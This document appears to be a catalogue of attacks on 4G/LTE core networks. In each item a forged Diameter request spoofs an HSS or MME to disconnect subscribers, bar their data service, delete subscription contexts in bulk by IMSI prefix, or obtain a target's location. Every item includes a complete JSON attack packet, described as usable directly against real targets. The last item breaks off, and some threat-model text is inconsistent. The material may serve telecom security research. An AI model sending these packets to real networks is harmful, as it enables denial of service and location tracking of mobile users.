## 1) PUR - Origin-Host

**Message:** Purge-UE-Request (PUR)
**Target Diameter Field:** Origin-Host

**Threat Model:**
- **Attack Assumption:**
In the target 4G/LTE network, a network element MME provides cellular services to subscriber UEs by coordinating with other trusted HSS nodes over the Diameter interface.
We assume: (i) the victim HSS’s Diameter interface is exposed to the public Internet due to misconfiguration; (ii) an Internet attacker can impersonate a MME and establish a Diameter connection to the victim HSS; (iii) the victim HSS does not enable IPsec/TLS and thus cannot authenticate the identity of the attacker; (iv) the victim HSS processes attacker-crafted Diameter Requests and returns the corresponding Diameter Answers on the same connection; and (v) the attacker has obtained the target UE’s IMSI.

**Attacker Capability:**
The attacker is limited to interacting with the victim HSS over the Diameter connection established by the attacker itself. For each attack attempt, the attacker actively sends a Diameter Request message on this connection and passively receives the corresponding Diameter Answer message returned by the victim HSS. The attacker cannot observe, modify, or interfere with Diameter traffic on connections between legitimate network elements.

**Exploitability Analysis:**

**Attack Procedure:**
The attacker crafts a Message Purge-UE-Request (PUR), ensuring that only mandatory fields are included with a well-formed structure and valid values, while all other unrelated AVPs are excluded. This allows the victim HSS to correctly parse and process the request. Specifically, the attacker sets the Origin-Host AVP to mme.system.com, thereby impersonating the legitimate MME identity stored by the victim HSS for the target IMSI. The attacker then sends the crafted PUR to the victim HSS to induce an unauthorized state transition for the target UE.

After processing the forged PUR, the HSS accepts the request as if it were sent by the legitimate serving MME and marks the target UE as purged in that MME. The forged EPS purge indication further triggers HSS-initiated IMS deregistration toward the S-CSCF via RTR, causing the target UE to lose VoLTE service. The PoC is successful if the issue can be reproduced.


**Attack Message:**
The following is a complete test packet in a fixed JSON structure. Testers only need to substitute the environment-specific variables with actual values from their target environment to use it directly for real testing.

{
  "diameter_header": {
    "version": 1,
    "command_code": 321,
"application_id": 16777251

  },
  "avps": [
    {
      "avp_name": "Session-Id",
      "avp_value": "mme1.system.com;1732377600;12"
    },
    {
      "avp_name": "Vendor-Specific-Application-Id",
      "grouped_avp": [
        {
          "avp_name": "Vendor-Id",
          "avp_value": 10415
        },
        {
          "avp_name": "Auth-Application-Id",
          "avp_value": 16777251
        }
      ]
    },
    {
      "avp_name": "Auth-Session-State",
      "avp_value": 1
    },
    {
      "avp_name": "Origin-Host",
      "avp_value": "mme.system.com"
    },
    {
      "avp_name": "Origin-Realm",
      "avp_value": "system.com"
    },
    {
      "avp_name": "Destination-Host",
      "avp_value": "hss1.system.com"
    },
    {
      "avp_name": "Destination-Realm",
      "avp_value": "system.com"
    },
    {
      "avp_name": "User-Name",
      "avp_value": "460000123456001"
    }
  ]
}

**Classification:**
ATTACK


## 2) ULR - ULR-Flags
**Message:** Update-Location-Request (ULR)
**Target Diameter Field:** ULR-Flags
**Threat Model:**
- **Attack Assumption:**
In the target 4G/LTE network, a network element MME provides cellular services to subscriber UEs by coordinating with other trusted HSS nodes over the Diameter interface.
We assume: (i) the victim HSS’s Diameter interface is exposed to the public Internet due to misconfiguration; (ii) an Internet attacker can impersonate a MME and establish a Diameter connection to the victim HSS; (iii) the victim HSS does not enable IPsec/TLS and thus cannot authenticate the identity of the attacker; (iv) the victim HSS processes attacker-crafted Diameter Requests and returns the corresponding Diameter Answers on the same connection; and (v) the attacker has obtained the target UE’s IMSI.
- **Attacker Capability:**
The attacker is limited to interacting with the victim HSS over the Diameter connection established by the attacker itself. For each attack attempt, the attacker actively sends a Diameter Request message on this connection and passively receives the corresponding Diameter Answer message returned by the victim HSS. The attacker cannot observe, modify, or interfere with Diameter traffic on connections between legitimate network elements.


**Exploitability Analysis:**

After receiving the spoofed ULR, the victim HSS accepts it as a legitimate Update-Location-Request for the target IMSI. The attack message sets `ULR-Flags = 32`, which sets bit 5 (`Initial-Attach-Indicator`), making the request appear to be triggered by an initial attach.

Since the target IMSI is already registered at the real MME, the HSS treats the spoofed ULR as a serving-node change. According to TS 29.272 and TS 23.401, the HSS sends a Cancel-Location-Request to the previous MME with `Cancellation-Type = MME_UPDATE_PROCEDURE`. The previous MME acknowledges the cancellation and removes the target UE's MM and bearer contexts. If the target UE has active bearer contexts on the previous MME, that MME releases the associated gateway-side bearer resources by sending `Delete Session Request` messages toward the SGW. As a result, the UE's existing cellular data path is torn down from the network side. The UE then initiates a new attach/registration procedure and retrieves fresh subscription state through the legitimate HSS path, so service can recover quickly. The observed impact is therefore a transient cellular service interruption.

**Attack Procedure:**

The attacker crafts a Message Update-Location-Request (ULR), ensuring that only mandatory fields are included with a well-formed structure and valid values, while all other unrelated AVPs are excluded. This allows the victim HSS to correctly parse and handle the request. Specifically, the attacker sets the ULR-Flags AVP to 32 (Initial-Attach-Indicator bit), which signals to the victim HSS that the target UE has just performed an initial attach. The attacker then sends the crafted ULR to the victim HSS to cause an negative security impact on the target UE.

After the HSS processes the message, the target UE will immediately lose cellular service on the legitimate network. The PoC is successful if the issue can be reproduced.

**Attack Message:**
The following is a complete test packet in a fixed JSON structure. Testers only need to substitute the environment-specific variables with actual values from their target environment to use it directly for real testing.

{
  "diameter_header": {
    "version": 1,
    "command_code": 316,
"application_id": 16777251
  },
  "avps": [
    {
      "avp_name": "Session-Id",
      "avp_value": "mme1.system.com;1732377600;8"
    },
    {
      "avp_name": "Vendor-Specific-Application-Id",
      "grouped_avp": [
        {
          "avp_name": "Vendor-Id",
          "avp_value": 10415
        },
        {
          "avp_name": "Auth-Application-Id",
          "avp_value": 16777251
        }
      ]
    },
    {
      "avp_name": "Auth-Session-State",
      "avp_value": 1
    },
    {
      "avp_name": "Origin-Host",
      "avp_value": "mme1.system.com"
    },
    {
      "avp_name": "Origin-Realm",
      "avp_value": "system.com"
    },
    {
      "avp_name": "Destination-Host",
      "avp_value": "hss1.system.com"
    },
    {
      "avp_name": "Destination-Realm",
      "avp_value": "system.com"
    },
    {
      "avp_name": "User-Name",
      "avp_value": "460000123456001"
    },
    {
      "avp_name": "RAT-Type",
      "avp_value": 1004,
    },
    {
      "avp_name": "ULR-Flags",
      "avp_value": 32
    },
    {
      "avp_name": "Visited-PLMN-Id",
      "avp_value": "64F000"
    }
  ]
}
**Classification:**
ATTACK

## 3) IDR - Access-Restriction-Data
**Message:** Insert-Subscriber-Data-Request (IDR)
**Target Diameter Field:** Access-Restriction-Data
**Threat Model:**
- **Attack Assumption:**
In the target 4G/LTE network, a network element MME provides cellular services to subscriber UEs by coordinating with other trusted HSS nodes over the Diameter interface.
We assume: (i) the victim MME’s Diameter interface is exposed to the public Internet due to misconfiguration; (ii) an Internet attacker can impersonate an HSS and establish a Diameter connection to the victim MME; (iii) the victim MME does not enable IPsec/TLS and thus cannot authenticate the identity of the attacker; (iv) the victim MME processes attacker-crafted Diameter Requests and returns the corresponding Diameter Answers on the same connection; and (v) the attacker has obtained the target UE’s IMSI.
- **Attacker Capability:**
The attacker is limited to interacting with the victim HSS over the Diameter connection established by the attacker itself. For each attack attempt, the attacker actively sends a Diameter Request message on this connection and passively receives the corresponding Diameter Answer message returned by the victim HSS. The attacker cannot observe, modify, or interfere with Diameter traffic on connections between legitimate network elements.

**Exploitability Analysis:**

After receiving the spoofed IDR, the victim MME accepts it as a legitimate subscriber-data update from the HSS and updates the stored subscription data for the target IMSI. The attacker-supplied `Access-Restriction-Data = 16` sets bit 4, `WB-E-UTRAN Not Allowed`, so the MME records that the subscriber is not allowed to access LTE/E-UTRAN.

On the next Attach or Tracking Area Update procedure, the MME checks the stored access restriction data before admitting the UE. Since E-UTRAN access is marked as restricted, the MME rejects the UE instead of accepting the registration. In the tested implementation, this results in an `ATTACH REJECT` with EMM cause `#7` (`EPS services not allowed`), leaving the UE unable to attach to LTE until the corrupted subscription data in the MME is refreshed or corrected.

**Attack Procedure:**
The attacker crafts a Message Insert-Subscriber-Data-Request (IDR), ensuring that only mandatory fields are included with a well-formed structure and valid values, while all other unrelated AVPs are excluded. Specifically, the attacker sets the Access-Restriction-Data AVP to 16, which enables `WB-E-UTRAN Not Allowed`. The attacker then sends the crafted IDR to the victim MME to cause a negative security impact on the target UE or the network.

After the MME processes the message, the target UE will lose cellular service on its next reconnection to the network (e.g., after toggling airplane mode or rebooting) . The PoC is successful if the issue can be reproduced.


**Attack Message:**

The following is a complete test packet in a fixed JSON structure. Testers only need to substitute the environment-specific variables with actual values from their target environment to use it directly for real testing.
{
  "diameter_header": {
    "version": 1,
    "command_code": 319,
"application_id": 16777251

  },
  "avps": [
    {
      "avp_name": "Session-Id",
      "avp_value": "hss1.system.com;1732377600;10"
    },
    {
      "avp_name": "Vendor-Specific-Application-Id",
      "grouped_avp": [
        {
          "avp_name": "Vendor-Id",
          "avp_value": 10415
        },
        {
          "avp_name": "Auth-Application-Id",
          "avp_value": 16777251
        }
      ]
    },
    {
      "avp_name": "Auth-Session-State",
      "avp_value": 1
    },
    {
      "avp_name": "Origin-Host",
      "avp_value": "hss1.system.com"
    },
    {
      "avp_name": "Origin-Realm",
      "avp_value": "system.com"
    },
    {
      "avp_name": "Destination-Host",
      "avp_value": "mme1.system.com"
    },
    {
      "avp_name": "Destination-Realm",
      "avp_value": "system.com"
    },
    {
      "avp_name": "User-Name",
      "avp_value": "460000123456001"
    },
    {
      "avp_name": "Subscription-Data",
      "grouped_avp": [
        {
          "avp_name": "Access-Restriction-Data",
          "avp_value": 16
        }
      ]
    }
  ]
}

**Classification:**
ATTACK

## 4) IDR - Service-Selection

**Message:** Insert-Subscriber-Data-Request (IDR)
**Target Diameter Field:** Subscription-Data.APN-Configuration-Profile.APN-Configuration.Service-Selection

**Threat Model:**
- **Attack Assumption:**
In the target 4G/LTE network, a network element MME provides cellular services to subscriber UEs by coordinating with other trusted HSS nodes over the Diameter interface.

We assume: (i) the victim MME’s Diameter interface is exposed to the public Internet due to misconfiguration; (ii) an Internet attacker can impersonate an HSS and establish a Diameter connection to the victim MME; (iii) the victim MME does not enable IPsec/TLS and thus cannot authenticate the identity of the attacker; (iv) the victim MME processes attacker-crafted Diameter Requests and returns the corresponding Diameter Answers on the same connection; and (v) the attacker has obtained the target UE’s IMSI.

- **Attacker Capability:**
The attacker is limited to interacting with the victim HSS over the Diameter connection established by the attacker itself. For each attack attempt, the attacker actively sends a Diameter Request message on this connection and passively receives the corresponding Diameter Answer message returned by the victim HSS. The attacker cannot observe, modify, or interfere with Diameter traffic on connections between legitimate network elements.

**Exploitability Analysis:**
After receiving the spoofed IDR, the victim MME accepts it as a legitimate subscriber-data update from the HSS and updates the stored APN configuration for the target IMSI. The attacker-supplied `APN-Configuration` uses the target `Context-Identifier` and replaces the `Service-Selection` value with attacker.internet. As a result, the MME stores an invalid APN for the subscriber. On the next PDN connection establishment, the MME uses this stored `Service-Selection` value to populate the APN IE in the GTPv2-C `Create Session Request`. Therefore, the `Create Session Request` is sent with APN set to attacker.internet. Since this APN is not valid in the target network, the session establishment fails with “Missing or unknown APN”. The MME maps this failure to NAS ESM cause #27 and sends a `PDN CONNECTIVITY REJECT` to the UE. 

As a result, because the modified APN-Configuration uses `Context-Identifier = 1`, which corresponds to the default APN/default PDN context in this profile, the UE cannot establish the default PDN connection required during EPS attach. The attach procedure therefore fails or completes without usable cellular data service. If the attacker instead modifies another `Context-Identifier`, the impact is limited to the corresponding APN/PDN connection, such as `ims` for VoLTE rather than the default data connection.

**Attack Procedure:**
The attacker crafts a Message Insert-Subscriber-Data-Request (IDR), ensuring that only mandatory fields are included with a well-formed structure and valid values, while all other unrelated fileds are excluded. Specifically, the attacker sets the `Service-Selection` field to attacker.internet (an invalid/unreachable APN). The attacker then sends the crafted IDR to the victim MME to cause an negative security impact on the target UE.

After the MME processes the message, the target UE will lose cellular data service on its next connection attempt (e.g., after toggling airplane mode or rebooting). The PoC is successful if the issue can be reproduced.


**Attack Message:**
The following is a complete test packet in a fixed JSON structure. Testers only need to substitute the environment-specific variables with actual values from their target environment to use it directly for real testing.

{
  "diameter_header": {
    "version": 1,
    "command_code": 319,
    "application_id": 16777251

  },
  "avps": [
    {
      "avp_name": "Session-Id",
      "avp_value": "hss1.system.com;1732377600;10"
    },
    {
      "avp_name": "Vendor-Specific-Application-Id",
      "grouped_avp": [
        {
          "avp_name": "Vendor-Id",
          "avp_value": 10415
        },
        {
          "avp_name": "Auth-Application-Id",
          "avp_value": 16777251
        }
      ]
    },
    {
      "avp_name": "Auth-Session-State",
      "avp_value": 1
    },
    {
      "avp_name": "Origin-Host",
      "avp_value": "hss1.system.com"
    },
    {
      "avp_name": "Origin-Realm",
      "avp_value": "system.com"
    },
    {
      "avp_name": "Destination-Host",
      "avp_value": "mme1.system.com"
    },
    {
      "avp_name": "Destination-Realm",
      "avp_value": "system.com"
    },
    {
      "avp_name": "User-Name",
      "avp_value": "460000123456001"
    },
    {
      "avp_name": "Subscription-Data",
      "grouped_avp": [
        {
          "avp_name": "APN-Configuration-Profile",
          "grouped_avp": [
            {
              "avp_name": "Context-Identifier",
              "avp_value": 1
            },
            {
              "avp_name": "All-APN-Configurations-Included-Indicator",
              "avp_value": 1
            },
            {
              "avp_name": "APN-Configuration",
              "grouped_avp": [
                {
                  "avp_name": "Context-Identifier",
                  "avp_value": 1
                },
                {
                  "avp_name": "PDN-Type",
                  "avp_value": 0
                },
                {
                  "avp_name": "Service-Selection",
                  "avp_value": "attacker.internet"
                },
                {
                  "avp_name": "EPS-Subscribed-QoS-Profile",
                  "grouped_avp": [
                    {
                      "avp_name": "QoS-Class-Identifier",
                      "avp_value": 9
                    },
                    {
                      "avp_name": "Allocation-Retention-Priority",
                      "grouped_avp": [
                        {
                          "avp_name": "Priority-Level",
                          "avp_value": 1
                        }
                      ]
                    }
                  ]
                },
                {
                  "avp_name": "AMBR",
                  "grouped_avp": [
                    {
                      "avp_name": "Max-Requested-Bandwidth-UL",
                      "avp_value": 50000000
                    },
                    {
                      "avp_name": "Max-Requested-Bandwidth-DL",
                      "avp_value": 100000000
                    }
                  ]
                }
              ]
            }
          ]
        }
      ]
    }
  ]
}

**Classification:**
ATTACK

## 5) IDR - Operator-Determined-Barring
**Message:** Insert-Subscriber-Data-Request (IDR)
**Target Diameter Field:** Subscription-Data.Operator-Determined-Barring
**Threat Model:**
- **Attack Assumption:**
In the target 4G/LTE network, a network element MME provides cellular services to subscriber UEs by coordinating with other trusted HSS nodes over the Diameter interface.
We assume: (i) the victim MME’s Diameter interface is exposed to the public Internet due to misconfiguration; (ii) an Internet attacker can impersonate an HSS and establish a Diameter connection to the victim MME; (iii) the victim MME does not enable IPsec/TLS and thus cannot authenticate the identity of the attacker; (iv) the victim MME processes attacker-crafted Diameter Requests and returns the corresponding Diameter Answers on the same connection; and (v) the attacker has obtained the target UE’s IMSI.
- **Attacker Capability:**
The attacker is limited to interacting with the victim HSS over the Diameter connection established by the attacker itself. For each attack attempt, the attacker actively sends a Diameter Request message on this connection and passively receives the corresponding Diameter Answer message returned by the victim HSS. The attacker cannot observe, modify, or interfere with Diameter traffic on connections between legitimate network elements.

**Exploitability Analysis:**
After receiving the spoofed IDR, the victim MME accepts it as a legitimate subscriber-data update from the HSS and updates the stored subscription data for the target IMSI. The attack message sets bit 0 of `Operator-Determined-Barring`, i.e., `All Packet Oriented Services Barred`. As a result, the MME records that packet-oriented services are barred for the target subscriber.

Once the forged ODB state is applied, the MME releases the UE's packet data connectivity and detaches the UE. After detach, TS 23.401 allows the MME either to delete the UE's locally stored subscription data and MM context immediately, or to retain them for some time so they can be reused at a later attach without contacting the HSS. If the MME deletes the context, the UE's immediate re-attach causes the MME to retrieve fresh subscription data from the legitimate HSS via the ULR/ULA procedure, so the forged ODB state is cleared and service quickly recovers. If the MME instead retains and reuses the polluted subscription context, the forged ODB state remains effective. Subsequent attach or PDN connectivity attempts can then be rejected with operator-determined barring until the MME refreshes or corrects the stored subscription data.


**Attack Procedure:**

The attacker crafts a Message Insert-Subscriber-Data-Request (IDR), ensuring that only mandatory fields are included with a well-formed structure and valid values, while all other unrelated AVPs are excluded. This allows the victim MME to correctly parse and handle the request. Specifically, the attacker sets the Operator-Determined-Barring AVP to 1 (All Packet Oriented Services Barred) and Subscriber-Status to 1 (OPERATOR DETERMINED BARRING). The attacker then sends the crafted IDR to the victim MME to cause an negative security impact on the target UE or the network.

After the MME processes the message, the target UE will immediately lose all cellular data services. The PoC is successful if the issue can be reproduced.

**Attack Message:**
The following is a complete test packet in a fixed JSON structure. Testers only need to substitute the environment-specific variables with actual values from their target environment to use it directly for real testing.

{
  "diameter_header": {
    "version": 1,
    "command_code": 319,
"application_id": 16777251

  },
  "avps": [
    {
      "avp_name": "Session-Id",
      "avp_value": "hss1.system.com;1732377600;10"
    },
    {
      "avp_name": "Vendor-Specific-Application-Id",
      "grouped_avp": [
        {
          "avp_name": "Vendor-Id",
          "avp_value": 10415
        },
        {
          "avp_name": "Auth-Application-Id",
          "avp_value": 16777251
        }
      ]
    },
    {
      "avp_name": "Auth-Session-State",
      "avp_value": 1
    },
    {
      "avp_name": "Origin-Host",
      "avp_value": "hss1.system.com"
    },
    {
      "avp_name": "Origin-Realm",
      "avp_value": "system.com"
    },
    {
      "avp_name": "Destination-Host",
      "avp_value": "mme1.system.com"
    },
    {
      "avp_name": "Destination-Realm",
      "avp_value": "system.com"
    },
    {
      "avp_name": "User-Name",
      "avp_value": "460000123456001"
    },
    {
      "avp_name": "Subscription-Data",
      "grouped_avp": [
        {
          "avp_name": "Subscriber-Status",
          "avp_value": 1
        },
        {
          "avp_name": "Operator-Determined-Barring",
          "avp_value": 1
        }
      ]
    }
  ]
}

**Classification:**
ATTACK

## 6) CLR - Cancellation-Type
**Message:** Cancel-Location-Request (CLR)
**Target Diameter Field:** Cancellation-Type
**Threat Model:**
- **Attack Assumption:**
In the target 4G/LTE network, a network element MME provides cellular services to subscriber UEs by coordinating with other trusted HSS nodes over the Diameter interface.
We assume: (i) the victim MME’s Diameter interface is exposed to the public Internet due to misconfiguration; (ii) an Internet attacker can impersonate an HSS and establish a Diameter connection to the victim MME; (iii) the victim MME does not enable IPsec/TLS and thus cannot authenticate the identity of the attacker; (iv) the victim MME processes attacker-crafted Diameter Requests and returns the corresponding Diameter Answers on the same connection; and (v) the attacker has obtained the target UE’s IMSI.
- **Attacker Capability:**
The attacker is limited to interacting with the victim HSS over the Diameter connection established by the attacker itself. For each attack attempt, the attacker actively sends a Diameter Request message on this connection and passively receives the corresponding Diameter Answer message returned by the victim HSS. The attacker cannot observe, modify, or interfere with Diameter traffic on connections between legitimate network elements.

**Exploitability Analysis:**

After receiving the spoofed CLR, the victim MME accepts it as a legitimate Cancel-Location-Request from the HSS and uses the `Cancellation-Type` value to decide how to process the subscriber state. 

When `Cancellation-Type` is set to `SUBSCRIPTION_WITHDRAWAL`, the MME releases the UE's EPS bearer resources, removes the local subscription/MM context, and sends a network-initiated detach/reject toward the UE. If the UE receives an `EPS services not allowed` indication, TS 24.301 makes the UE treat EPS service as not allowed; for UEs configured to use `T3245`, this can suppress normal LTE re-attachment for a random 12-24 hour period, until the timer expires, the UE is switched off, or the UICC is removed. Therefore, this forged CLR can cause a temporary or long-duration LTE service outage depending on the UE's timer behavior. When `Cancellation-Type` is set to `MME_UPDATE_PROCEDURE`, the MME still releases the UE's EPS bearer resources and removes the local subscription/MM context, causing a temporary loss of connectivity; however, the UE can immediately initiate a new attach procedure.

**Attack Procedure:**

The attacker crafts a Message Cancel-Location-Request (CLR), ensuring that only mandatory fields are included with a well-formed structure and valid values, while all other unrelated AVPs are excluded. This allows the victim MME to correctly parse and handle the request. Specifically, the attacker sets the Cancellation-Type AVP to 2 (SUBSCRIPTION_WITHDRAWAL). The attacker then sends the crafted CLR to the victim MME to cause an negative security impact on the target UE or the network.

After the MME processes the message, the MME then deletes the UE context and initiates a detach procedure, causing the target UE to immediately lose cellular service. The PoC is successful if the issue can be reproduced.

**Attack Message:**
The following is a complete test packet in a fixed JSON structure. Testers only need to substitute the environment-specific variables with actual values from their target environment to use it directly for real testing.

{
  "diameter_header": {
    "version": 1,
    "command_code": 317,
"application_id": 16777251
  },
  "avps": [
    {
      "avp_name": "Session-Id",
      "avp_value": "hss1.system.com;1732377600;9"
    },
    {
      "avp_name": "Auth-Session-State",
      "avp_value": 1
    },
    {
      "avp_name": "Origin-Host",
      "avp_value": "hss1.system.com"
    },
    {
      "avp_name": "Origin-Realm",
      "avp_value": "system.com"
    },
    {
      "avp_name": "Destination-Host",
      "avp_value": "mme1.system.com"
    },
    {
      "avp_name": "Destination-Realm",
      "avp_value": "system.com"
    },
    {
      "avp_name": "User-Name",
      "avp_value": "460000123456001"
    },
    {
      "avp_name": "Cancellation-Type",
      "avp_value": 2
    }
  ]
}

**Classification:**
ATTACK


## 7) DSR - Context-Identifier
**Message:** Delete-Subscriber-Data-Request (DSR)
**Target Diameter Field:** Context-Identifier
**Threat Model:**
- **Attack Assumption:**
In the target 4G/LTE network, a network element MME provides cellular services to subscriber UEs by coordinating with other trusted HSS nodes over the Diameter interface.
We assume: (i) the victim MME’s Diameter interface is exposed to the public Internet due to misconfiguration; (ii) an Internet attacker can impersonate an HSS and establish a Diameter connection to the victim MME; (iii) the victim MME does not enable IPsec/TLS and thus cannot authenticate the identity of the attacker; (iv) the victim MME processes attacker-crafted Diameter Requests and returns the corresponding Diameter Answers on the same connection; and (v) the attacker has obtained the target UE’s IMSI.
- **Attacker Capability:**
The attacker is limited to interacting with the victim HSS over the Diameter connection established by the attacker itself. For each attack attempt, the attacker actively sends a Diameter Request message on this connection and passively receives the corresponding Diameter Answer message returned by the victim HSS. The attacker cannot observe, modify, or interfere with Diameter traffic on connections between legitimate network elements.

**Exploitability Analysis:**
After receiving the spoofed DSR, the victim MME accepts it as a legitimate Delete-Subscriber-Data-Request from the HSS and processes the deletion according to `DSR-Flags`. In this message, `DSR-Flags = 8`, which sets bit 3 (`PDN subscription contexts Withdrawal`). Therefore, the MME uses the supplied `Context-Identifier` to identify the stored PDN subscription context to be deleted. According to TS 29.272, this deletion is valid only if the `Context-Identifier` is not associated with the default APN configuration; otherwise, the MME should reject the request.

When the `Context-Identifier` matches an active non-default APN subscription context, the MME deletes that PDN subscription context from the locally stored subscriber data. Because the deleted subscription context is associated with an active PDN connection, the MME initiates PDN disconnection by deactivating the affected EPS bearer contexts. The UE receives a `DEACTIVATE EPS BEARER CONTEXT REQUEST`, removes the corresponding bearer context, and loses data connectivity for that APN. The service remains unavailable until the deleted PDN subscription context is restored, for example by refreshing subscription data from the legitimate HSS or rebuilding the UE context.

**Attack Procedure:**
The attacker crafts a Message Delete-Subscriber-Data-Request (DSR), ensuring that only mandatory fields are included with a well-formed structure and valid values, while all other unrelated AVPs are excluded. This allows the victim MME to correctly parse and handle the request. Specifically, the attacker sets the Context-Identifier AVP to 2, which identifies the target UE’s active non-default PDN subscription context. The attacker then sends the crafted DSR to the victim MME to cause an negative security impact on the target UE or the network.

After the MME processes the message, the target UE will immediately lose all cellular data service. The PoC is successful if the issue can be reproduced.

**Attack Message:**
The following is a complete test packet in a fixed JSON structure. Testers only need to substitute the environment-specific variables with actual values from their target environment to use it directly for real testing.

{
  "diameter_header": {
    "version": 1,
    "command_code": 320,
"application_id": 16777251
  },
  "avps": [
    {
      "avp_name": "Session-Id",
      "avp_value": "hss1.system.com;1732377600;11"
    },
    {
      "avp_name": "Vendor-Specific-Application-Id",
      "grouped_avp": [
        {
          "avp_name": "Vendor-Id",
          "avp_value": 10415
        },
        {
          "avp_name": "Auth-Application-Id",
          "avp_value": 16777251
        }
      ]
    },
    {
      "avp_name": "Auth-Session-State",
      "avp_value": 1
    },
    {
      "avp_name": "Origin-Host",
      "avp_value": "hss1.system.com"
    },
    {
      "avp_name": "Origin-Realm",
      "avp_value": "system.com"
    },
    {
      "avp_name": "Destination-Host",
      "avp_value": "mme1.system.com"
    },
    {
      "avp_name": "Destination-Realm",
      "avp_value": "system.com"
    },
    {
      "avp_name": "User-Name",
      "avp_value": "460000123456001"
    },
    {
      "avp_name": "DSR-Flags",
      "avp_value": 8
    },
    {
      "avp_name": "Context-Identifier",
      "avp_value": 2
    }
  ]
}

**Classification:**
ATTACK


## 8) RSR - User-Id
**Message:** Reset-Request (RSR)
**Target Diameter Field:** User-Id
**Threat Model:**
- **Attack Assumption:**
In the target 4G/LTE network, a network element MME provides cellular services to subscriber UEs by coordinating with other trusted HSS nodes over the Diameter interface.
We assume: (i) the victim MME’s Diameter interface is exposed to the public Internet due to misconfiguration; (ii) an Internet attacker can impersonate an HSS and establish a Diameter connection to the victim MME; (iii) the victim MME does not enable IPsec/TLS and thus cannot authenticate the identity of the attacker; (iv) the victim MME processes attacker-crafted Diameter Requests and returns the corresponding Diameter Answers on the same connection; and (v) the attacker has obtained the target UE’s IMSI.
- **Attacker Capability:**
The attacker is limited to interacting with the victim HSS over the Diameter connection established by the attacker itself. For each attack attempt, the attacker actively sends a Diameter Request message on this connection and passively receives the corresponding Diameter Answer message returned by the victim HSS. The attacker cannot observe, modify, or interfere with Diameter traffic on connections between legitimate network elements.

**Exploitability Analysis:**

After receiving the spoofed RSR, the victim MME accepts it as a legitimate Reset-Request from the HSS and identifies the impacted subscriber records using the supplied `User-Id` prefix. Here, `User-Id = "46000"` matches all locally stored subscribers whose IMSI begins with that prefix, so the request can affect many subscribers at once.

Because the RSR includes `Subscription-Data-Deletion`, the MME applies the deletion to the impacted subscriber records as if a corresponding DSR had been received for each subscriber. In this message, `DSR-Flags = 8`, which sets bit 3 (`PDN subscription contexts Withdrawal`), and `Context-Identifier = 2` identifies the PDN subscription context to delete. Therefore, the MME removes that APN/PDN subscription context from each matched subscriber profile.

If the deleted context is associated with an active PDN connection, the MME may deactivate the affected EPS bearers and tear down the corresponding data connection. As a result, a single forged RSR can cause bulk APN-specific service disruption for all matched subscribers, rather than affecting only one IMSI. Service is restored only after the deleted subscription data is refreshed from the legitimate HSS or the affected UE contexts are rebuilt.

**Attack Procedure:**
The attacker crafts a POC Message Reset-Request (RSR), ensuring that only required and attack-relevant AVPs are included with a well-formed structure and valid values, while all other unrelated AVPs are excluded. This allows the victim MME to correctly parse and handle the request. Specifically, the attacker sets the `User-Id` AVP to `"46000"` (the PLMN prefix, i.e. MCC+MNC in UTF8String format), which matches all subscribers whose IMSI begins with these leading digits. The attacker also includes `Subscription-Data-Deletion` with `DSR-Flags = 8` and `Context-Identifier = 2`, causing the matched subscribers' PDN subscription context with `Context-Identifier = 2` to be deleted. The attacker then sends the crafted RSR to the victim MME to trigger a bulk APN/PDN subscription deletion affecting all matched subscribers.

After the MME processes the message, all matched subscribers lose the targeted APN/PDN subscription context. If that context is associated with an active PDN connection, the MME can deactivate the affected EPS bearers and interrupt the corresponding data connection. The PoC is successful if matched subscribers lose service for the targeted APN/PDN context after the forged RSR is processed.

**Attack Message:**
The following is a complete test packet in a fixed JSON structure. Testers only need to substitute the environment-specific variables with actual values from their target environment to use it directly for real testing.

{
  "diameter_header": {
    "version": 1,
    "command_code": 322,
    "application_id": 16777251
  },
  "avps": [
    {
      "avp_name": "Session-Id",
      "avp_value": "hss1.system.com;1732377600;1"
    },
    {
      "avp_name": "Vendor-Specific-Application-Id",
      "grouped_avp": [
        {
          "avp_name": "Vendor-Id",
          "avp_value": 10415
        },
        {
          "avp_name": "Auth-Application-Id",
          "avp_value": 16777251
        }
      ]
    },
    {
      "avp_name": "Auth-Session-State",
      "avp_value": 1
    },
    {
      "avp_name": "Origin-Host",
      "avp_value": "hss1.system.com"
    },
    {
      "avp_name": "Origin-Realm",
      "avp_value": "system.com"
    },
    {
      "avp_name": "Destination-Host",
      "avp_value": "mme1.system.com"
    },
    {
      "avp_name": "Destination-Realm",
      "avp_value": "system.com"
    },
    {
      "avp_name": "User-Id",
      "avp_value": "46000"
    },
    {
      "avp_name": "Reset-ID",
      "avp_value": "hss1.system.com/shared-profile-1"
    },
    {
      "avp_name": "Subscription-Data-Deletion",
      "grouped_avp": [
        {
          "avp_name": "DSR-Flags",
          "avp_value": 8
        },
        {
          "avp_name": "Context-Identifier",
          "avp_value": 2
        }
      ]
    }
  ]
}

**Classification:**
ATTACK


## 9) IDA - EPS-Location-Information

**Message:** Insert-SubscriberData-Answer (IDA)

**Target Diameter Field:** EPS-Location-Information

**Threat Model:**
- **Attack Assumption:**

In the target 4G/LTE network, a network element MME provides cellular services to subscriber UEs by coordinating with other trusted HSS nodes over the Diameter interface.
We assume: (i) the victim MME’s Diameter interface is exposed to the public Internet due to misconfiguration; (ii) an Internet attacker can impersonate an HSS and establish a Diameter connection to the victim MME; (iii) the victim MME does not enable IPsec/TLS and thus cannot authenticate the identity of the attacker; (iv) the victim MME processes attacker-crafted Diameter Requests and returns the corresponding Diameter Answers on the same connection; and (v) the attacker has obtained the target UE’s IMSI.

- **Attacker Capability:**
The attacker is limited to interacting with the victim HSS over the Diameter connection established by the attacker itself. For each attack attempt, the attacker actively sends a Diameter Request message on this connection and passively receives the corresponding Diameter Answer message returned by the victim HSS. The attacker cannot observe, modify, or interfere with Diameter traffic on connections between legitimate network elements. 


**Attack Procedure:**
The attacker crafts a Message Insert-SubscriberData-Request (IDR), ensuring that only mandatory fields are included with a well-formed structure and valid values, while all other unrelated AVPs are excluded. This allows the victim MME to correctly parse and handle the request. Specifically, the attacker sets the IDR-Flags AVP to 24 (bit 3 "EPS-Location-Information-Request" and bit 4 "Current-Location-Request" are set to 1). The attacker sends the crafted IDR to the victim MME to obtain sensitive information from the corresponding Diameter Answer.

After the victim MME processes the message, it returns an Insert-Subscriber-Data-Answer (IDA) that includes the EPS-Location-Information AVP. Since EPS-Location-Information carries UE-associated location data, it discloses privacy-sensitive UE location information to the attacker. In addition, the stolen location data enables follow-on abuse: the attacker can track the target user’s physical movements, infer habits and routines, or facilitate targeted physical attacks. The PoC is successful if the attacker receives an IDA in which the EPS-Location-Information AVP is present and non-empty.


**Exploitability Analysis:**

